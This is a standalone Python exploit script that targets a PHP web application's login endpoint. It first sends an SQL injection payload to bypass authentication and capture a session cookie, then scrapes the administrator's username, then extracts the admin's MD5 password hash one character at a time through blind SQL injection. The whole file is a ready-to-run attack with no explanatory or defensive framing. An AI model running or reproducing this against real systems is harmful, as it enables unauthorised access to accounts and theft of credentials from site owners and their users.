#!/usr/bin/env python3

import requests
import re
import string
import sys

hex_string = string.ascii_letters + string.digits

if len(sys.argv) != 2:
    print("[~] Usage python3 exploit.py <URL>")
    sys.exit(1)

url = sys.argv[1]

def leak_username():
    global url
    data = {
            "username" : "' or '1'='1'-- -",
            "password" : "musyoka"
            }
    output = requests.post(f"{url}/classes/Login.php?f=login", data = data)
    cookie = output.headers
    cookie = cookie["Set-Cookie"]
    auth_cookie = cookie.split(";")[0]
    print(f"[+] Authenticated cookie: {cookie}")
    print("[+] Leaking username")
    username = requests.get(f"{url}/?page=user", headers = {"Cookie" : auth_cookie})
    user = re.search('username" id="username" class="form-control" value="(.*?)"', username.text, re.DOTALL).group(1)
    print(f"[+] username leaked: {user}\n")
    print("[+] Brute force MD5 password hash using blind SQL Injection")
    return user

def leak_password():
    global hex_string, url
    username = leak_username()
    admin_hash = ""
    while len(admin_hash) != 32:
        for letter in hex_string:
            write = admin_hash + letter
            sys.stdout.write(f"\r[+] Hash Leaked: {write}")
            payload = f"{username}' and binary password  like '{write}%'-- -"
            data = {
                    "username" : payload,
                    "password" : "musyoka"
                    }
            output = requests.post(f"{url}/classes/Login.php?f=login", data = data)
            if "success" in output.text:
                admin_hash += letter
                break
if __name__ ==  ("__main__"):
    leak_password()
